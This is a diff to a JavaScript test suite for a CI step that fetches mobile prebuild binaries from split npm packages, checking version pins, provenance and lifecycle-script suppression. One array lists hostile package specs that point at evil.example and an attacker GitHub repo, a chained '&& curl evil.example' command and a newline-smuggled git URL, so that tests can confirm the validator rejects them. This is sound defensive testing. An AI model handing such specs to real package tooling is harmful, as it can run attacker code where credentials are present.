@@ -84,6 +84,7 @@ function runStep({
   token = 'ghs-test-token',
   seedPrebuilds = false,
   ancestorPackageJson = false,
+  platform = 'Android',
   npmEnv = {},
 } = {}) {
   const directory = mkdtempSync(join(tmpdir(), 'qvac-mobile-prebuilds-'))
@@ -133,6 +134,7 @@ function runStep({
         PACKAGE_VERSION: packageVersion,
         FORCE_NPM_PREBUILD: force,
         GPR_TOKEN: token,
+        PLATFORM: platform,
         MOCK_NPM_LOG: npmLog,
         ...npmEnv,
       },
@@ -154,6 +156,14 @@ function runStep({
     ),
     androidPrebuildInstalled: existsSync(
       join(workdir, 'prebuilds/android-arm64/addon.bare'),
+    ),
+    iosPrebuildInstalled: existsSync(
+      join(workdir, 'prebuilds/ios-arm64/addon.bare'),
+    ),
+    // The 'ios' slice carries the simulator host dirs too; losing them would
+    // leave the build phase without a simulator binary.
+    iosSimulatorPrebuildInstalled: existsSync(
+      join(workdir, 'prebuilds/ios-arm64-simulator/addon.bare'),
     ),
     // Sampled by mock-npm while the file still exists — the step deletes it.
     npmrcMode: (invocations.match(/^npmrc_mode=(.+)$/m) || [])[1],
@@ -511,7 +521,10 @@ test('provenance mismatch fails instead of testing the wrong binary', () => {
   assert.match(run.output, /but package-version pins/)
 })
 
-test('a package without prebuilds/ is rejected', () => {
+// A GPR dev build is never sliced, so naming a @tetherto/<addon>-mono-<platform>
+// package would send its author after something that cannot exist. The real
+// fault is an on-merge run that published without its prebuild artifacts.
+test('a @tetherto dev build without prebuilds/ is called out as an unsliced publish', () => {
   const run = runStep({
     packageVersion: '@tetherto/llm-llamacpp-mono@0.47.0-tmp.runid-1',
     force: 'true',
@@ -519,7 +532,323 @@ test('a package without prebuilds/ is rejected', () => {
   })
 
   assert.notEqual(run.status, 0)
-  assert.match(run.output, /No prebuilds directory found/)
+  assert.match(run.output, /@tetherto\/llm-llamacpp-mono@0\.47\.0-tmp\.runid-1 ships no prebuilds/)
+  assert.match(run.output, /GPR dev builds are published unsliced/)
+  assert.doesNotMatch(
+    run.output,
+    /-mono-android-arm64/,
+    'must not name a GPR slice package, which can never exist',
+  )
+  assert.equal(run.invocations.match(/^spec=/gm).length, 1, 'no second resolve')
+  assert.equal(run.androidPrebuildInstalled, false)
+})
+
+// The @qvac equivalent: neither layout, so there genuinely is nothing to test.
+// Here naming the platform package IS right — it says which slice was missing.
+test('a @qvac package with neither prebuilds/ nor slices is rejected', () => {
+  const run = runStep({
+    addonName: '@qvac/llm-llamacpp',
+    packageVersion: '@qvac/llm-llamacpp@0.47.0',
+    force: 'true',
+    npmEnv: { MOCK_NPM_NO_PREBUILDS: '1', MOCK_NPM_VERSION: '0.47.0' },
+  })
+
+  assert.notEqual(run.status, 0)
+  assert.match(run.output, /No prebuilds in @qvac\/llm-llamacpp@0\.47\.0/)
+  assert.match(
+    run.output,
+    /no @qvac\/llm-llamacpp-android-arm64 in its optionalDependencies/,
+    'the failure must name the platform package it looked for',
+  )
+  assert.equal(run.androidPrebuildInstalled, false)
+})
+
+// Split addons (QVAC-24574 / QVAC-25055). asr, tts and audiogen publish a
+// JS-only @qvac meta package plus per-platform ones. The step used to hard-fail
+// on "No prebuilds directory found in package" the moment it unpacked such a
+// tarball, killing every standalone mobile dispatch for those addons before the
+// build and before any device time.
+
+const SPLIT = { MOCK_NPM_SPLIT: '1', MOCK_NPM_VERSION: '0.5.0' }
+
+test('a split addon resolves its Android prebuild from the platform package', () => {
+  const run = runStep({
+    addonName: '@qvac/asr-ggml',
+    packageVersion: '@qvac/asr-ggml@0.5.0',
+    force: 'true',
+    platform: 'Android',
+    npmEnv: SPLIT,
+  })
+
+  assert.equal(run.status, 0, run.output)
+  assert.match(run.invocations, /spec=@qvac\/asr-ggml@0\.5\.0/)
+  assert.match(run.invocations, /spec=@qvac\/asr-ggml-android-arm64@0\.5\.0/)
+  assert.ok(run.androidPrebuildInstalled, 'the slice supplied the android prebuild')
+  assert.match(
+    run.output,
+    /Verified: Android prebuilds come from @qvac\/asr-ggml-android-arm64@0\.5\.0/,
+  )
+})
+
+test('a split addon resolves its iOS prebuild, simulators included', () => {
+  const run = runStep({
+    addonName: '@qvac/asr-ggml',
+    packageVersion: '@qvac/asr-ggml@0.5.0',
+    force: 'true',
+    platform: 'iOS',
+    npmEnv: SPLIT,
+  })
+
+  assert.equal(run.status, 0, run.output)
+  assert.match(run.invocations, /spec=@qvac\/asr-ggml-ios@0\.5\.0/)
+  assert.ok(run.iosPrebuildInstalled, 'the slice supplied the ios-arm64 prebuild')
+  assert.ok(
+    run.iosSimulatorPrebuildInstalled,
+    'the ios slice ships the simulator host dirs and they must survive the move',
+  )
+  // Android and iOS ship in DIFFERENT slices; fetching the wrong one would put
+  // no usable binary on the device.
+  assert.doesNotMatch(run.invocations, /asr-ggml-android-arm64/)
+})
+
+// The reported failure verbatim: a standalone dispatch with no pin at all.
+test('a split addon with an empty package-version reaches the device', () => {
+  const run = runStep({
+    addonName: '@qvac/asr-ggml',
+    platform: 'iOS',
+    npmEnv: { MOCK_NPM_SPLIT: '1', MOCK_NPM_VERSION: '0.5.0' },
+  })
+
+  assert.equal(run.status, 0, run.output)
+  assert.match(run.invocations, /spec=@qvac\/asr-ggml@latest/)
+  assert.match(run.invocations, /spec=@qvac\/asr-ggml-ios@0\.5\.0/)
+  assert.ok(run.iosPrebuildInstalled)
+  assert.doesNotMatch(
+    run.output,
+    /No prebuilds directory found in package/,
+    'the pre-QVAC-25055 hard failure must be gone',
+  )
+})
+
+// buildOptionalDependencies() copies metaManifest.version into every entry, so
+// these are equal for anything the slicer produced. Following a difference would
+// install a build the caller never pinned, after the step already printed
+// "Verified: ... (pinned)" for the meta — the QVAC-21879 shape.
+test('a slice pinned away from the meta version is refused', () => {
+  const run = runStep({
+    addonName: '@qvac/asr-ggml',
+    packageVersion: '@qvac/asr-ggml@0.5.0',
+    force: 'true',
+    npmEnv: { ...SPLIT, MOCK_NPM_SLICE_PIN: '0.4.9' },
+  })
+
+  assert.notEqual(run.status, 0, 'must not follow a pin away from the meta version')
+  assert.match(run.output, /not at its own version/)
+  assert.doesNotMatch(
+    run.invocations,
+    /-android-arm64@/,
+    'npm must not be invoked for a slice pinned away from the meta version',
+  )
+  assert.equal(run.androidPrebuildInstalled, false)
+})
+
+test('a slice that resolves to a different version fails instead of installing', () => {
+  const run = runStep({
+    addonName: '@qvac/asr-ggml',
+    packageVersion: '@qvac/asr-ggml@0.5.0',
+    force: 'true',
+    npmEnv: { ...SPLIT, MOCK_NPM_SLICE_VERSION: '0.1.0' },
+  })
+
+  assert.notEqual(run.status, 0, 'a pin that resolves elsewhere must not be used')
+  assert.match(run.output, /resolved to @qvac\/asr-ggml-android-arm64@0\.1\.0/)
+  assert.equal(run.androidPrebuildInstalled, false)
+})
+
+test('a slice that resolves to a different package fails instead of installing', () => {
+  const run = runStep({
+    addonName: '@qvac/asr-ggml',
+    packageVersion: '@qvac/asr-ggml@0.5.0',
+    force: 'true',
+    npmEnv: { ...SPLIT, MOCK_NPM_SLICE_NAME: '@qvac/tts-ggml-android-arm64' },
+  })
+
+  assert.notEqual(run.status, 0, "another addon's slice must not reach the device")
+  assert.match(run.output, /resolved to @qvac\/tts-ggml-android-arm64/)
+  assert.equal(run.androidPrebuildInstalled, false)
+})
+
+test('a meta published without its slices fails loudly, never falling back', () => {
+  const run = runStep({
+    addonName: '@qvac/asr-ggml',
+    packageVersion: '@qvac/asr-ggml@0.5.0',
+    force: 'true',
+    npmEnv: { ...SPLIT, MOCK_NPM_SLICE_FAIL: '1' },
+  })
+
+  assert.notEqual(run.status, 0)
+  assert.match(run.output, /Failed to download @qvac\/asr-ggml-android-arm64@0\.5\.0/)
+  assert.equal(run.androidPrebuildInstalled, false)
+})
+
+test('a slice carrying no binaries is rejected rather than silently empty', () => {
+  const run = runStep({
+    addonName: '@qvac/asr-ggml',
+    packageVersion: '@qvac/asr-ggml@0.5.0',
+    force: 'true',
+    npmEnv: { ...SPLIT, MOCK_NPM_SLICE_NO_PREBUILDS: '1' },
+  })
+
+  assert.notEqual(run.status, 0)
+  assert.match(run.output, /contains no addon\/prebuilds/)
+})
+
+// The pin and addon-identity checks run on the meta manifest BEFORE the slice is
+// resolved, so a rejected meta must never reach the registry a second time.
+test("a split addon still rejects another addon's package before fetching a slice", () => {
+  const run = runStep({
+    addonName: '@qvac/asr-ggml',
+    packageVersion: '@qvac/tts-ggml@0.9.0',
+    force: 'true',
+    npmEnv: { MOCK_NPM_SPLIT: '1', MOCK_NPM_VERSION: '0.9.0' },
+  })
+
+  assert.notEqual(run.status, 0)
+  assert.match(run.output, /is not a build of @qvac\/asr-ggml/)
+  assert.doesNotMatch(
+    run.invocations,
+    /-android-arm64/,
+    'no slice may be fetched for a package that failed provenance',
+  )
+})
+
+test('a split addon still rejects a pin the registry did not honour', () => {
+  const run = runStep({
+    addonName: '@qvac/asr-ggml',
+    packageVersion: '@qvac/asr-ggml@0.5.0',
+    force: 'true',
+    npmEnv: { MOCK_NPM_SPLIT: '1', MOCK_NPM_VERSION: '0.4.2' },
+  })
+
+  assert.notEqual(run.status, 0)
+  assert.match(run.output, /but package-version pins 0\.5\.0/)
+})
+
+// @tetherto dev builds are published unsliced, so the split path must not engage
+// for them — otherwise "test my unmerged native change" would chase @qvac slices
+// that were never published to GitHub Packages.
+test('a @tetherto dev build of a split addon still uses its inline prebuilds', () => {
+  const run = runStep({
+    addonName: '@qvac/asr-ggml',
+    packageVersion: '@tetherto/asr-ggml-mono@0.5.1-tmp.runid-42',
+    force: 'true',
+    npmEnv: { MOCK_NPM_VERSION: '0.5.1-tmp.runid-42' },
+  })
+
+  assert.equal(run.status, 0, run.output)
+  assert.ok(run.androidPrebuildInstalled)
+  assert.doesNotMatch(
+    run.invocations,
+    /-android-arm64@/,
+    'the -mono tarball carries prebuilds/, so no slice resolve should happen',
+  )
+})
+
+// The slice spec's version half is REGISTRY-CONTROLLED. `name@<spec>` is an npm
+// alias, so whatever follows the '@' decides the spec type: "evil/repo" resolves
+// as a GitHub shorthand and `npm pack` would clone it and RUN its prepare script,
+// in a step holding a GPR credential. The caller's spec is already regex-gated
+// for this reason; the slice spec must be too.
+const HOSTILE_SLICE_PINS = [
+  'evil/repo',
+  'git+https://github.com/evil/x.git',
+  'git+ssh://git@evil.example/x.git',
+  'https://evil.example/payload.tgz',
+  'file:/tmp/evil.tgz',
+  'npm:other-package@1.0.0',
+  'github:attacker/repo',
+  'latest',
+  '^1.2.0',
+  '1.0.0 && curl evil.example',
+  // A line-oriented check would pass this on its first line alone; bash =~
+  // matches the whole string, so the newline cannot hide the payload.
+  '0.0.1\ngit+https://evil.example/x.git',
+]
+
+for (const pin of HOSTILE_SLICE_PINS) {
+  test(`a slice pinned to a non-exact-version spec is refused: ${JSON.stringify(pin)}`, () => {
+    const run = runStep({
+      addonName: '@qvac/asr-ggml',
+      packageVersion: '@qvac/asr-ggml@0.5.0',
+      force: 'true',
+      npmEnv: { ...SPLIT, MOCK_NPM_SLICE_PIN: pin },
+    })
+
+    assert.notEqual(run.status, 0, `must fail closed on slice pin ${pin}`)
+    assert.match(
+      run.output,
+      /is not an exact version|cannot appear in a version/,
+      `expected a validation error for ${pin}, got:\n${run.output}`,
+    )
+    // The decisive assertion: npm is never handed the hostile spec, so no
+    // clone, fetch or prepare script can run.
+    assert.doesNotMatch(
+      run.invocations,
+      /-android-arm64@/,
+      `npm must not be invoked for slice pin ${pin}`,
+    )
+    assert.equal(run.androidPrebuildInstalled, false)
+  })
+}
+
+test('a legitimate prerelease version is still accepted', () => {
+  // The guards must not be so tight that they reject what the slicer can write:
+  // the meta version it copies into every entry may carry a prerelease suffix.
+  const run = runStep({
+    addonName: '@qvac/asr-ggml',
+    packageVersion: '@qvac/asr-ggml@0.5.0-rc.1',
+    force: 'true',
+    npmEnv: { MOCK_NPM_SPLIT: '1', MOCK_NPM_VERSION: '0.5.0-rc.1' },
+  })
+
+  assert.equal(run.status, 0, run.output)
+  assert.match(run.invocations, /spec=@qvac\/asr-ggml-android-arm64@0\.5\.0-rc\.1/)
+  assert.ok(run.androidPrebuildInstalled)
+})
+
+test('both npm pack invocations disable lifecycle scripts', () => {
+  // Defence in depth behind the spec validations: a no-op when packing a
+  // registry tarball, and neuters `prepare` if a non-registry spec slips past.
+  const run = runStep({
+    addonName: '@qvac/asr-ggml',
+    packageVersion: '@qvac/asr-ggml@0.5.0',
+    force: 'true',
+    npmEnv: SPLIT,
+  })
+
+  assert.equal(run.status, 0, run.output)
+  const packs = run.invocations.match(/^ignore_scripts=(.*)$/gm) || []
+  assert.equal(packs.length, 2, `expected two packs, got:\n${run.invocations}`)
+  assert.deepEqual(
+    [...new Set(packs)],
+    ['ignore_scripts=yes'],
+    'every npm pack must pass --ignore-scripts',
+  )
+})
+
+// Artifact-first precedence is upstream of all of this: when the run built its
+// own binaries, no npm resolve happens at all, split or not.
+test("artifacts still win over a split addon's published slices", () => {
+  const run = runStep({
+    addonName: '@qvac/asr-ggml',
+    force: 'false',
+    seedPrebuilds: true,
+    npmEnv: SPLIT,
+  })
+
+  assert.equal(run.status, 0, run.output)
+  assert.equal(run.invocations, '', 'npm must not run when artifacts are present')
+  assert.ok(run.prebuildMarkerSurvived)
 })
 
 // Every mobile addon routes through this one step, so a change here can break an
